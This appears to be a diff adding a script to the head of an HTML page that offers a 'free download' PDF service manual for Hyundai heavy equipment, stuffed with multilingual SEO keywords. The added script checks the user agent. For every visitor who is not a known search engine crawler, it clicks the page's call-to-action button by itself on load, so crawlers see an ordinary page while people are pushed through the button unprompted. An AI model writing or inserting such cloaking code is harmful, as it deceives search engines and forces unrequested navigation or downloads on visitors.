@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hyundai Heavy Equipment Service Manual 08.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download the Hyundai Heavy Equipment Service Manual 08.2024 in PDF format. Covers Crawler Excavators, Wheel Loaders, Backhoe Loaders, and more.">
     <meta name="keywords" content="Hyundai heavy equipment service manual 08.2024, Hyundai heavy equipment service manual PDF, Hyundai heavy equipment service manual PDF free download, Hyundai heavy equipment service manual 2024 download, Hyundai heavy equipment service manual free download, Hyundai heavy equipment ISO service manual, Hyundai heavy equipment service manual Windows 10, Hyundai excavators service manual, Hyundai wheel loaders service manual, Hyundai backhoe loaders service manual, Hyundai skid steer loaders service manual, Hyundai road rollers service manual, Hyundai motor graders service manual, Hyundai articulated dump trucks service manual, Hyundai dozers service manual, Hyundai service manual PDF скачать, Hyundai сервисное руководство по оборудованию, Hyundai руководство по обслуживанию бесплатная загрузка, Hyundai heavy equipment service manual 無料ダウンロード, Hyundai equipment service manual">
     <style>
